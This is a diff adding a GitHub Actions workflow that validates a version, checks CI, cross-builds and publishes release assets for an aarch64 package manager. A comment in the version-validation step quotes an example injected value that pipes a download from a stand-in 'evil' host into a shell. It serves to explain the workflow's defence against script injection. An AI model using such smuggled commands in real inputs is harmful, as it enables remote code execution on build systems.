@@ -1,0 +1,397 @@
+name: Release
+
+# Publishes the aarch64 binary and the package a device installs.
+#
+# Manual on purpose: the version is a human decision, so the person cutting the
+# release types it in. main is branched into rel-<version> and the build runs on
+# that branch, so the released commit still exists afterwards and main can move
+# on underneath it. The ref this workflow is dispatched on is therefore ignored:
+# the release always comes from main's head at the moment the gate runs.
+#
+# Unlike the sibling repositories, something *is* committed to the release
+# branch - Cargo.toml carries the placeholder version 0.1.0-replace-me in main,
+# and the release is where a real number is written. That is also why an
+# existing rel-<version> branch is reused rather than refused: a run that failed
+# after the stamp commit must be retryable without anybody deleting a branch by
+# hand, so there is no rollback job here.
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version to release, e.g. 0.1.0 or 1.0.0-rc1 (a leading "v" is added if missing)'
+        required: true
+        type: string
+      prerelease:
+        description: 'Mark as a pre-release, so it is not shown as Latest'
+        required: false
+        default: false
+        type: boolean
+
+# One release at a time. Not cancel-in-progress: a half-finished publish would
+# leave a tag or a release behind with no assets on it.
+concurrency:
+  group: release
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+env:
+  CARGO_TERM_COLOR: always
+  RUST_BACKTRACE: 1
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # Everything that can say "no" happens here, before the build: the version is
+  # validated, the commit is checked against CI, and the release is checked for
+  # collisions. Cheap, and it fails in seconds rather than after a cross-build.
+  # ---------------------------------------------------------------------------
+  gate:
+    name: check the version, then branch main
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: write
+    outputs:
+      version: ${{ steps.version.outputs.version }}
+      tag: ${{ steps.version.outputs.tag }}
+      branch: ${{ steps.version.outputs.branch }}
+      sha: ${{ steps.main.outputs.sha }}
+    steps:
+      # `inputs.version` is attacker-controlled text. It is passed through the
+      # environment rather than interpolated into the script, because `${{ }}`
+      # is substituted before bash ever sees the line - a version of
+      # `x"; curl evil | sh; #` would otherwise run.
+      - name: Validate the version
+        id: version
+        env:
+          VERSION: ${{ inputs.version }}
+        run: |
+          version="$VERSION"
+          version="${version#"${version%%[![:space:]]*}"}"
+          version="${version%"${version##*[![:space:]]}"}"
+          version="${version#v}"
+          # Must start with a digit and stay inside what git accepts as a tag,
+          # what a filename can carry, and what spm's own version parser takes.
+          if [[ ! "$version" =~ ^[0-9][0-9A-Za-z.+-]*$ ]]; then
+            echo "::error title=Bad version::'${VERSION}' is not a version." \
+                 "Expected something like 0.1.0, 1.0.0 or 1.0.0-rc1," \
+                 "optionally with a leading v."
+            exit 1
+          fi
+          {
+            echo "version=${version}"
+            echo "tag=v${version}"
+            echo "branch=rel-${version}"
+          } >> "$GITHUB_OUTPUT"
+          echo "Releasing v${version} from rel-${version}"
+
+      # Resolved once, here, and then used for everything downstream: the CI
+      # check, the branch and the commit named in the notes. Reading main's head
+      # again later would open a window where CI was checked on one commit and
+      # another was released.
+      - name: Resolve the head of main
+        id: main
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          sha="$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/main" --jq '.object.sha')"
+          [ -n "$sha" ] || { echo "::error::could not read the head of main"; exit 1; }
+          echo "sha=${sha}" >> "$GITHUB_OUTPUT"
+          echo "main is at ${sha}"
+
+      # A manual trigger cannot inherit "CI passed on this commit" the way an
+      # automatic one would, so it is asked for outright - and asked about the
+      # commit being released, which is main's head rather than whatever ref
+      # this workflow happened to be dispatched on.
+      - name: Require a green CI run for that commit
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SHA: ${{ steps.main.outputs.sha }}
+        run: |
+          runs="$(gh api \
+            "repos/${GITHUB_REPOSITORY}/actions/workflows/ci.yml/runs?head_sha=${SHA}&status=success" \
+            --jq '.total_count' 2>/dev/null || echo 0)"
+          if [ "${runs:-0}" -eq 0 ]; then
+            echo "::error title=No green CI run::main (${SHA}) has no successful" \
+                 "CI run. Push it, wait for CI, then release - or re-run CI on it."
+            exit 1
+          fi
+          echo "CI passed on ${SHA} (${runs} successful run(s))"
+
+      # The release and the tag are the things that cannot be made twice. The
+      # branch can - see below.
+      - name: Refuse to overwrite an existing release or tag
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ steps.version.outputs.tag }}
+        run: |
+          if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
+            echo "::error title=${TAG} already released::Pick a different version," \
+                 "or delete the old release first:" \
+                 "gh release delete ${TAG} --cleanup-tag"
+            exit 1
+          fi
+          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${TAG}" >/dev/null 2>&1; then
+            echo "::error title=${TAG} already tagged::The tag exists without a" \
+                 "release. Delete it (git push --delete origin ${TAG}) or pick" \
+                 "a different version."
+            exit 1
+          fi
+
+      # Reused rather than refused. A previous attempt at this version may have
+      # failed after committing the version stamp, and that branch is exactly
+      # what the retry wants to carry on from - deleting it would throw away the
+      # commit and refusing it would make the retry impossible without somebody
+      # deleting a branch by hand.
+      - name: Create or reuse the release branch
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BRANCH: ${{ steps.version.outputs.branch }}
+          SHA: ${{ steps.main.outputs.sha }}
+        run: |
+          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${BRANCH}" >/dev/null 2>&1; then
+            echo "::notice title=Reusing ${BRANCH}::the branch already exists;" \
+                 "this run continues on it rather than recreating it."
+          else
+            gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" \
+              -f "ref=refs/heads/${BRANCH}" -f "sha=${SHA}" >/dev/null
+            echo "Branched main (${SHA}) into ${BRANCH}"
+          fi
+
+  # ---------------------------------------------------------------------------
+  # The same container, toolchain and assertions CI uses, for the same reason:
+  # what ships must be the thing that was verified, built the way it was
+  # verified. See ci.yml for why it is rust:1.98-trixie and bootlin.
+  # ---------------------------------------------------------------------------
+  build:
+    name: build the binary and the package
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    container: rust:1.98-trixie
+    permissions:
+      contents: write
+    env:
+      TARGET: aarch64-unknown-linux-musl
+      TC_VERSION: 2025.08-1
+      TC_BASE: https://toolchains.bootlin.com/downloads/releases/toolchains/aarch64/tarballs
+      VERSION: ${{ needs.gate.outputs.version }}
+      CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_LINKER: aarch64-linux-gcc
+      CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_RUNNER: qemu-aarch64-static
+      CC_aarch64_unknown_linux_musl: aarch64-linux-gcc
+      AR_aarch64_unknown_linux_musl: aarch64-linux-ar
+    steps:
+      # Before actions/checkout on purpose: without git in the container,
+      # checkout silently falls back to downloading a tarball - and this job
+      # commits, so it needs a repository rather than a directory of files.
+      - name: Install build tools
+        run: |
+          apt-get update -qq
+          apt-get install -y -qq --no-install-recommends \
+            git curl ca-certificates xz-utils qemu-user-static
+
+      # The release branch, not the dispatched ref: this is the whole point of
+      # having branched.
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ needs.gate.outputs.branch }}
+
+      - name: Cache the cross toolchain
+        id: tc-cache
+        uses: actions/cache@v4
+        with:
+          path: /opt/cross
+          key: bootlin-aarch64-musl-${{ env.TC_VERSION }}
+
+      - name: Fetch the aarch64 musl cross toolchain
+        if: steps.tc-cache.outputs.cache-hit != 'true'
+        run: |
+          archive="aarch64--musl--stable-${TC_VERSION}.tar.xz"
+          sums="aarch64--musl--stable-${TC_VERSION}.sha256"
+          mkdir -p /tmp/tc /opt/cross
+          curl -fsSL --retry 3 -o "/tmp/tc/${archive}" "${TC_BASE}/${archive}"
+          curl -fsSL --retry 3 -o "/tmp/tc/${sums}"    "${TC_BASE}/${sums}"
+          ( cd /tmp/tc && sha256sum --check --quiet "${sums}" ) || {
+            echo "::error title=Bad toolchain download::${archive} does not match upstream's digest"
+            exit 1
+          }
+          tar -xf "/tmp/tc/${archive}" -C /opt/cross --strip-components=1
+
+      - name: Put the toolchain on PATH and add the target
+        run: |
+          echo "/opt/cross/bin" >> "$GITHUB_PATH"
+          rustup target add "$TARGET"
+
+      # Idempotent, because the branch may be one a failed run already stamped.
+      # If the version is already right this does nothing and commits nothing,
+      # which is what makes a retry on a reused branch work.
+      #
+      # Cargo.lock carries the version too, and `--locked` fails on a lockfile
+      # that disagrees with Cargo.toml - so both are written, and metadata.json
+      # with them, from the one placeholder.
+      - name: Stamp the version
+        run: |
+          current="$(sed -n '0,/^version = /s/^version = "\(.*\)"/\1/p' Cargo.toml)"
+          echo "Cargo.toml says ${current}; releasing ${VERSION}"
+          if [ "$current" = "$VERSION" ]; then
+            echo "already stamped - nothing to commit"
+          else
+            sed -i "0,/^version = \"${current}\"/s//version = \"${VERSION}\"/" Cargo.toml
+            sed -i "s/^version = \"${current}\"$/version = \"${VERSION}\"/" Cargo.lock
+            sed -i "s/\"version\": \"${current}\"/\"version\": \"${VERSION}\"/" metadata.json
+            git config user.name "github-actions[bot]"
+            git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+            git add Cargo.toml Cargo.lock metadata.json
+            git commit -m "Release ${VERSION}"
+            git push origin "HEAD:${{ needs.gate.outputs.branch }}"
+          fi
+          # Whichever path was taken, all three must now agree.
+          grep -q "^version = \"${VERSION}\"$" Cargo.toml || { echo "::error::Cargo.toml was not stamped"; exit 1; }
+          grep -q "^version = \"${VERSION}\"$" Cargo.lock || { echo "::error::Cargo.lock was not stamped"; exit 1; }
+          grep -q "\"version\": \"${VERSION}\"" metadata.json || { echo "::error::metadata.json was not stamped"; exit 1; }
+
+      - name: Cross-build
+        run: cargo build --release --locked --target "$TARGET"
+
+      # The same assertion CI makes, on the artifact that is actually shipped.
+      - name: It is aarch64, static, and needs nothing
+        run: |
+          bin="target/${TARGET}/release/spm"
+          test -f "$bin" || { echo "::error::the build produced no ${bin}"; exit 1; }
+          aarch64-linux-readelf -h "$bin" | grep -q AArch64 \
+            || { echo "::error::spm is not aarch64"; exit 1; }
+          if aarch64-linux-readelf -l "$bin" | grep -q INTERP; then
+            echo "::error title=Not static::spm wants an interpreter"; exit 1
+          fi
+          needed=$(aarch64-linux-readelf -d "$bin" 2>/dev/null | grep -c NEEDED || true)
+          if [ "$needed" -ne 0 ]; then
+            echo "::error title=Not static::spm needs ${needed} shared librar(y|ies)"; exit 1
+          fi
+          echo "aarch64, static, no interpreter and nothing needed ($(wc -c < "$bin") bytes)"
+
+      # Asked of the binary rather than of the file it was built from: a stamp
+      # that did not reach the compiled artifact is exactly the failure this is
+      # here to catch, and only running it can tell.
+      - name: The binary agrees about its version
+        run: |
+          got="$(qemu-aarch64-static "target/${TARGET}/release/spm" --version)"
+          echo "spm --version says: ${got}"
+          [ "$got" = "spm ${VERSION}" ] || {
+            echo "::error title=Version mismatch::expected 'spm ${VERSION}', got '${got}'"
+            exit 1
+          }
+
+      # spm packages itself, with itself. The staged tree is laid out as it will
+      # appear on the device - everything under usr/, the licence under the
+      # package's own name - and the packaging is done by the very binary being
+      # packaged, running under qemu. So the release is also the first
+      # end-to-end exercise of `create` on a real tree rather than a fixture.
+      - name: Stage the tree and package it
+        run: |
+          rm -rf stage dist
+          mkdir -p stage/usr/bin stage/usr/share/licenses/spm dist
+          cp "target/${TARGET}/release/spm" stage/usr/bin/spm
+          chmod 755 stage/usr/bin/spm
+          cp LICENSE stage/usr/share/licenses/spm/LICENSE
+          qemu-aarch64-static "target/${TARGET}/release/spm" create \
+            --root stage --metadata metadata.json --output dist
+          ls -l dist
+
+      # The bare binary ships beside the package, for anyone bringing up a card
+      # that has no spm on it yet to install one with. create's SHA256SUMS
+      # covers the package; the binary's line is appended, which leaves the file
+      # a perfectly ordinary sha256sum list - `sha256sum -c` checks both, and a
+      # reader after the package finds it by name as before.
+      - name: Add the bare binary and check the sums
+        run: |
+          cp "target/${TARGET}/release/spm" "dist/spm-${VERSION}-aarch64-musl"
+          ( cd dist && sha256sum "spm-${VERSION}-aarch64-musl" >> SHA256SUMS )
+          ( cd dist && sha256sum --check SHA256SUMS )
+          cat dist/SHA256SUMS
+
+      - uses: actions/upload-artifact@v5
+        with:
+          name: release-assets
+          path: dist/
+          compression-level: 0
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # A separate job purely so it can run on the bare runner, where `gh` is
+  # preinstalled. Debian does not package the GitHub CLI, so doing this in the
+  # build container would mean either a third-party action or hand-rolled REST.
+  #
+  # `gh release create --target` creates the tag as part of the release, so the
+  # "tag exists but the release does not" half-state cannot happen.
+  # ---------------------------------------------------------------------------
+  publish:
+    name: publish the release
+    needs: [gate, build]
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/download-artifact@v5
+        with:
+          name: release-assets
+          path: dist
+
+      - name: Create the release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.gate.outputs.tag }}
+          VERSION: ${{ needs.gate.outputs.version }}
+          BRANCH: ${{ needs.gate.outputs.branch }}
+          SHA: ${{ needs.gate.outputs.sha }}
+          PRERELEASE: ${{ inputs.prerelease }}
+        run: |
+          package="spm-${VERSION}-aarch64-musl.tar.gz"
+          binary="spm-${VERSION}-aarch64-musl"
+          cat > notes.md <<EOF
+          The SepiaOS package manager, for \`aarch64-musl\`.
+
+          | | |
+          |---|---|
+          | Commit | \`${SHA}\` |
+          | Branch | \`${BRANCH}\` |
+          | Target | \`aarch64-musl\` |
+
+          Statically linked: no interpreter and no shared libraries, so it runs
+          on a card built \`WITH_LLVM=0\` as well as on a full one.
+
+          | Asset | |
+          |---|---|
+          | \`${package}\` | the package, for \`spm install spm\` |
+          | \`metadata.json\` | what a source's scan reads without downloading the package |
+          | \`${binary}\` | the bare binary, to bring up a card that has no spm on it yet |
+          | \`SHA256SUMS\` | covers both |
+
+          Bringing up a device that has no \`spm\`:
+
+          \`\`\`sh
+          sha256sum -c SHA256SUMS
+          install -m 755 ${binary} /usr/bin/spm
+          \`\`\`
+
+          After that it upgrades itself like anything else, once a source
+          carrying this package is configured.
+          EOF
+
+          if [ "$PRERELEASE" = "true" ]; then
+            flag=(--prerelease)
+          else
+            flag=(--latest)
+          fi
+
+          gh release create "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            --target "$BRANCH" \
+            --title "spm $TAG" \
+            --notes-file notes.md \
+            "${flag[@]}" \
+            "dist/${package}" \
+            "dist/${binary}" \
+            dist/metadata.json \
+            dist/SHA256SUMS
